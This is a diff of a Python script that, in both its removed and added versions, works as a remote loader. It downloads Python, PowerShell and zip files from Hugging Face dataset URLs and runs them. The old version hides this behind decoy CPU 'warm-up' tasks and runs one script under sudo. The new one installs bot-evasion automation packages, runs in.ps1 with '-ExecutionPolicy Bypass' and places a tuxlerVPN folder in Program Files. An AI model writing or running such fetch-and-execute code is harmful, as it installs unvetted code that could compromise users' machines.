@@ -1,320 +1,201 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""Randomized bootstrap orchestrator with computational warm-up tasks."""
-
-import hashlib
-import os
-import random
-import string
 import subprocess
 import sys
-import time
+import os
+import shutil
+import zipfile
 from pathlib import Path
+
+def install_package(package_name):
+    """تثبيت مكتبة باستخدام pip"""
+    print(f"جاري تثبيت مكتبة {package_name}...")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
+        print(f"تم تثبيت {package_name} بنجاح.")
+        return True
+    except Exception as e:
+        print(f"فشل تثبيت {package_name}: {e}")
+        return False
+
+# قائمة المكتبات المطلوبة (اسم الاستيراد : اسم المكتبة في pip)
+REQUIRED_PACKAGES = {
+    "requests": "requests",
+    "psutil": "psutil",
+    "pywinauto": "pywinauto",
+    "pyautogui": "pyautogui",
+    "cv2": "opencv-python",
+    "win32api": "pywin32",
+    "selenium": "selenium",
+    "undetected_chromedriver": "undetected-chromedriver",
+    "setuptools": "setuptools",
+    "webdriver_manager": "webdriver-manager",
+    "pytz": "pytz",
+    "playwright": "playwright"  # <--- تم إضافة playwright هنا
+}
+
+# التحقق من وجود جميع المكتبات وتثبيت المفقود منها تلقائياً
+for import_name, pip_name in REQUIRED_PACKAGES.items():
+    try:
+        __import__(import_name)
+    except ImportError:
+        print(f"مكتبة {pip_name} غير مثبتة. سيتم تثبيتها الآن...")
+        if not install_package(pip_name):
+            print(f"خطأ: لا يمكن المتابعة بدون مكتبة {pip_name}.")
+            sys.exit(1)
+
+# تثبيت متصفحات Playwright إذا لم تكن مثبّتة
+try:
+    print("تثبيت متصفحات Playwright...")
+    subprocess.check_call([sys.executable, "-m", "playwright", "install"])
+except Exception as e:
+    print(f"تنبيه: فشل تثبيت متصفحات Playwright: {e}")
+
+import requests
+import playwright
 
 os.environ["PYTHONIOENCODING"] = "utf-8"
 
-# ---------- silent dependency bootstrapping ----------
-_DEPS = ("requests", "psutil", "setuptools", "pytz")
-
-for _name in _DEPS:
-    try:
-        __import__(_name)
-    except ImportError:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", _name])
-
-import requests  # noqa: E402
-
-
-# ============================================================
-#   Random computational task engine
-# ============================================================
-_USED_TASKS = set()
-_TASK_KINDS = [
-    "sieve", "fib", "collatz", "matmul", "sortmix", "hashchain",
-    "anagram", "caesar", "bst", "montecarlo", "digitsum",
-    "kaprekar", "pascal", "binsearch",
-]
-
-
-def _pick_fresh_task():
-    """Return a task kind that hasn't been used yet in this process."""
-    pool = [t for t in _TASK_KINDS if t not in _USED_TASKS]
-    if not pool:
-        _USED_TASKS.clear()
-        pool = list(_TASK_KINDS)
-    choice = random.choice(pool)
-    _USED_TASKS.add(choice)
-    return choice
-
-
-def _random_work(seconds: float) -> None:
-    """Execute a random CPU-bound task for the given duration."""
-    kind = _pick_fresh_task()
-    rng = random.Random(
-        int(time.time() * 1_000_000)
-        ^ (os.getpid() << 17)
-        ^ random.getrandbits(48)
-    )
-    deadline = time.time() + seconds
-    tag = f"[{kind}|{seconds:g}s]"
-
-    if kind == "sieve":
-        limit = rng.randint(5_000, 80_000)
-        primes = []
-        for n in range(2, limit):
-            if time.time() >= deadline:
-                break
-            ok = True
-            for p in primes:
-                if p * p > n:
-                    break
-                if n % p == 0:
-                    ok = False
-                    break
-            if ok:
-                primes.append(n)
-        print(f"{tag} primes<{limit}={len(primes)}")
-
-    elif kind == "fib":
-        a, b, count = 0, 1, 0
-        while time.time() < deadline:
-            a, b = b, a + b
-            count += 1
-        print(f"{tag} fib_iters={count}")
-
-    elif kind == "collatz":
-        best_n, best_len = 0, 0
-        start = rng.randint(1, 10_000)
-        while time.time() < deadline:
-            x, steps = start, 0
-            while x != 1:
-                x = x // 2 if x % 2 == 0 else 3 * x + 1
-                steps += 1
-            if steps > best_len:
-                best_n, best_len = start, steps
-            start += 1
-        print(f"{tag} best_collatz n={best_n} len={best_len}")
-
-    elif kind == "matmul":
-        size = rng.randint(20, 55)
-        A = [[rng.random() for _ in range(size)] for _ in range(size)]
-        B = [[rng.random() for _ in range(size)] for _ in range(size)]
-        C = [[0.0] * size for _ in range(size)]
-        for i in range(size):
-            if time.time() >= deadline:
-                break
-            Ai, Ci = A[i], C[i]
-            for k in range(size):
-                aik, Bk = Ai[k], B[k]
-                for j in range(size):
-                    Ci[j] += aik * Bk[j]
-        print(f"{tag} matmul {size}x{size} ok")
-
-    elif kind == "sortmix":
-        n = rng.randint(50_000, 250_000)
-        data = [rng.random() for _ in range(n)]
-        data.sort()
-        print(f"{tag} sorted {n} floats")
-
-    elif kind == "hashchain":
-        h = hashlib.sha256()
-        count = 0
-        while time.time() < deadline:
-            h.update(str(count).encode())
-            h.digest()
-            count += 1
-        print(f"{tag} sha256_chain={count}")
-
-    elif kind == "anagram":
-        words = [
-            "".join(rng.choices(string.ascii_lowercase, k=rng.randint(4, 9)))
-            for _ in range(2_000)
-        ]
-        groups = {}
-        for w in words:
-            if time.time() >= deadline:
-                break
-            groups.setdefault("".join(sorted(w)), []).append(w)
-        print(f"{tag} anagram_groups={len(groups)}")
-
-    elif kind == "caesar":
-        text = "".join(rng.choices(string.ascii_letters + " ", k=40_000))
-        shift = rng.randint(1, 25)
-        out = []
-        for ch in text:
-            if time.time() >= deadline:
-                break
-            if ch.isalpha():
-                base = ord('A') if ch.isupper() else ord('a')
-                out.append(chr((ord(ch) - base + shift) % 26 + base))
-            else:
-                out.append(ch)
-        print(f"{tag} caesar shift={shift} out={len(out)}")
-
-    elif kind == "bst":
-        class Node:
-            __slots__ = ("v", "l", "r")
-            def __init__(self, v):
-                self.v, self.l, self.r = v, None, None
-        root, inserted = None, 0
-        while time.time() < deadline:
-            v = rng.randint(0, 1_000_000)
-            if root is None:
-                root = Node(v)
-            else:
-                cur = root
-                while True:
-                    if v < cur.v:
-                        if cur.l is None:
-                            cur.l = Node(v); break
-                        cur = cur.l
-                    else:
-                        if cur.r is None:
-                            cur.r = Node(v); break
-                        cur = cur.r
-            inserted += 1
-        print(f"{tag} bst_inserted={inserted}")
-
-    elif kind == "montecarlo":
-        inside = total = 0
-        while time.time() < deadline:
-            x, y = rng.random(), rng.random()
-            if x * x + y * y <= 1.0:
-                inside += 1
-            total += 1
-        pi_est = 4.0 * inside / max(total, 1)
-        print(f"{tag} pi~{pi_est:.5f} samples={total}")
-
-    elif kind == "digitsum":
-        count, biggest = 0, 0
-        while time.time() < deadline:
-            v = rng.randint(0, 10 ** 12)
-            s = sum(int(c) for c in str(v))
-            if s > biggest:
-                biggest = s
-            count += 1
-        print(f"{tag} digitsums={count} max={biggest}")
-
-    elif kind == "kaprekar":
-        count = 0
-        while time.time() < deadline:
-            n = rng.randint(1000, 9999)
-            steps = 0
-            while n != 6174 and steps < 20:
-                s = "".join(sorted(f"{n:04d}"))
-                n = int(s[::-1]) - int(s)
-                steps += 1
-            count += 1
-        print(f"{tag} kaprekar_runs={count}")
-
-    elif kind == "pascal":
-        rows = rng.randint(200, 400)
-        row = [1]
-        for _ in range(rows):
-            if time.time() >= deadline:
-                break
-            row = [1] + [row[i] + row[i + 1] for i in range(len(row) - 1)] + [1]
-        print(f"{tag} pascal_rows={rows} width={len(row)}")
-
-    elif kind == "binsearch":
-        n = rng.randint(200_000, 800_000)
-        arr = sorted(rng.randint(0, 10 ** 9) for _ in range(n))
-        hits = 0
-        while time.time() < deadline:
-            target = rng.randint(0, 10 ** 9)
-            lo, hi = 0, len(arr) - 1
-            while lo <= hi:
-                mid = (lo + hi) // 2
-                if arr[mid] == target:
-                    hits += 1
-                    break
-                if arr[mid] < target:
-                    lo = mid + 1
-                else:
-                    hi = mid - 1
-        print(f"{tag} binsearch_hits={hits}")
-
-
-# ============================================================
-#   Pipeline definition
-# ============================================================
-_REMOTE_SOURCES = [
+# ======================== Configuration ========================
+# دمجنا رابط كروميوم هنا ليتعامل مثل الإضافة وباقي الملفات
+DOWNLOAD_URLS = [
     "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/1.py",
     "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/in.ps1",
     "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/hash.py",
     "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/1first.py",
-    "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/openShrinkNew.py",
+    "https://huggingface.co/datasets/sjkhfuk/rdp/resolve/main/Downloads.zip",
+    "https://huggingface.co/datasets/gfdg34fsd/ngrik/resolve/main/openShrinkNew.py",
     "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/prep.py",
     "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/rest.py",
-    "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/restfirst.py",
+    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/restfirst.py",
+    "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/la222.py",
 ]
 
-_STAGING = Path.cwd() / "downloaded_files"
+TARGET_DIR = Path.cwd() / "downloaded_files"          # فولدر السكربتات والملفات المحملة
+ZIP_NAME = "Downloads.zip"
+EXTENSION_ZIP_NAME = "my_extension.zip"               
+CHROMIUM_ZIP_NAME = "Chromium.zip"                    
+TUXLER_SOURCE = TARGET_DIR / "tuxlerVPN"              
+TUXLER_DEST = Path("C:/Program Files (x86)/tuxlerVPN")
 
-_EXEC_PLAN = [
-    ("restfirst.py", True),   # elevate = True
-    ("la222.py", False),      # elevate = False
-]
+PYTHON_SCRIPTS = ["restfirst.py", "rest.py", "la222.py"]
+PS1_SCRIPT = "in.ps1"
 
-
-def _pull(url: str, dest: Path) -> bool:
+# ======================== Helper Functions ========================
+def download_file(url: str, dest_path: Path) -> bool:
+    """Download a single file from url to dest_path."""
     try:
-        print(f"  ↓ {url}")
-        r = requests.get(url, stream=True, timeout=30)
-        r.raise_for_status()
-        with dest.open("wb") as fh:
-            for chunk in r.iter_content(8192):
-                fh.write(chunk)
-        print(f"  ✓ {dest}")
+        print(f"Downloading {url} -> {dest_path}")
+        response = requests.get(url, stream=True, timeout=30)
+        response.raise_for_status()
+        with open(dest_path, "wb") as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        print(f"Downloaded: {dest_path}")
         return True
-    except Exception as exc:
-        print(f"  ✗ {url} -> {exc}")
+    except Exception as e:
+        print(f"Failed to download {url}: {e}")
         return False
 
+def download_all_files() -> bool:
+    """Download all files into TARGET_DIR."""
+    TARGET_DIR.mkdir(parents=True, exist_ok=True)
+    success = True
+    for url in DOWNLOAD_URLS:
+        filename = url.split("/")[-1]
+        dest = TARGET_DIR / filename
+        if not download_file(url, dest):
+            success = False
+    return success
 
-def _stage_all() -> bool:
-    _STAGING.mkdir(parents=True, exist_ok=True)
-    ok = True
-    for url in _REMOTE_SOURCES:
-        name = url.rsplit("/", 1)[-1]
-        if not _pull(url, _STAGING / name):
-            ok = False
-        _random_work(1)   # 1-second random task between downloads
-    return ok
-
-
-def _launch(script: str, elevate: bool) -> bool:
-    path = _STAGING / script
-    if not path.exists():
-        print(f"missing script: {path}")
+def extract_any_zip(zip_name: str, target_dir: Path) -> bool:
+    """دالة عامة لفك ضغط أي ملف في المسار المحدد"""
+    zip_path = target_dir / zip_name
+    if not zip_path.exists():
+        print(f"Error: {zip_name} not found in {target_dir}")
         return False
-    cmd = (["sudo"] if elevate else []) + [sys.executable, str(path)]
-    print(f"  ▶ {' '.join(cmd)}")
-    return subprocess.run(cmd, cwd=_STAGING).returncode == 0
+    try:
+        with zipfile.ZipFile(zip_path, "r") as zip_ref:
+            zip_ref.extractall(target_dir)
+        print(f"Extracted {zip_name} to {target_dir}")
+        return True
+    except Exception as e:
+        print(f"Failed to extract {zip_name}: {e}")
+        return False
 
+def run_powershell_script(script_path: Path) -> bool:
+    if not script_path.exists():
+        print(f"PowerShell script not found: {script_path}")
+        return False
+    try:
+        cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", str(script_path)]
+        print(f"Running: {' '.join(cmd)}")
+        result = subprocess.run(cmd, capture_output=True, text=True, cwd=TARGET_DIR)
+        if result.returncode != 0:
+            print(f"PowerShell script stderr:\n{result.stderr}")
+            return False
+        print(f"PowerShell script output:\n{result.stdout}")
+        return True
+    except Exception as e:
+        print(f"Failed to run PowerShell script: {e}")
+        return False
 
-def _run() -> int:
-    # -------- Phase 0: 30-second randomized warm-up --------
-    print(">>> phase 0 :: randomized 30s warm-up")
-    _random_work(30)
+def move_tuxler_folder():
+    if not TUXLER_SOURCE.exists():
+        print(f"Source folder not found: {TUXLER_SOURCE}")
+        return False
+    try:
+        if TUXLER_DEST.exists():
+            print(f"Destination {TUXLER_DEST} already exists. Removing it.")
+            shutil.rmtree(TUXLER_DEST)
+        shutil.move(str(TUXLER_SOURCE), str(TUXLER_DEST))
+        print(f"Moved {TUXLER_SOURCE} -> {TUXLER_DEST}")
+        return True
+    except Exception as e:
+        print(f"Failed to move folder: {e}")
+        return False
 
-    # -------- Phase 1: download everything --------
-    print(">>> phase 1 :: staging remote files")
-    if not _stage_all():
-        print("staging incomplete")
+def run_python_script(script_name: str) -> bool:
+    script_path = TARGET_DIR / script_name
+    if not script_path.exists():
+        print(f"Python script not found: {script_path}")
+        return False
+    try:
+        print(f"Running {script_name} ...")
+        result = subprocess.run([sys.executable, str(script_path)], cwd=TARGET_DIR)
+        if result.returncode != 0:
+            print(f"Script {script_name} failed.")
+            return False
+        return True
+    except Exception as e:
+        print(f"Failed to run {script_name}: {e}")
+        return False
+
+# ======================== Main Workflow ========================
+def main():
+    print("=== Step 1: Download all files ===")
+    if not download_all_files():
+        print("Some downloads failed. Aborting.")
         return 1
 
-    # -------- Phase 2: execute scripts with 1s tasks in between --------
-    print(">>> phase 2 :: running pipeline")
-    for script, elevate in _EXEC_PLAN:
-        _random_work(1)   # fresh 1-second task before each script
-        if not _launch(script, elevate):
-            print(f"step '{script}' failed")
+    print("\n=== Step 2: Extract Downloads.zip ===")
+    if not extract_any_zip(ZIP_NAME, TARGET_DIR):
+        print("Extraction for Downloads.zip failed. Aborting.")
+        return 1
+
+    print("\n=== Step 5: Run in.ps1 ===")
+    ps1_path = TARGET_DIR / PS1_SCRIPT
+    if not run_powershell_script(ps1_path):
+        print("PowerShell script execution failed. Aborting.")
+        return 1
+
+
+    print("\n=== Step 7: Run Python scripts in order ===")
+    for script in PYTHON_SCRIPTS:
+        if not run_python_script(script):
+            print(f"Failed at script {script}. Aborting.")
             return 1
 
-    print(">>> done :: all phases completed")
+    print("\n=== All tasks completed successfully ===")
     return 0
 
-
 if __name__ == "__main__":
-    sys.exit(_run())
+    sys.exit(main())
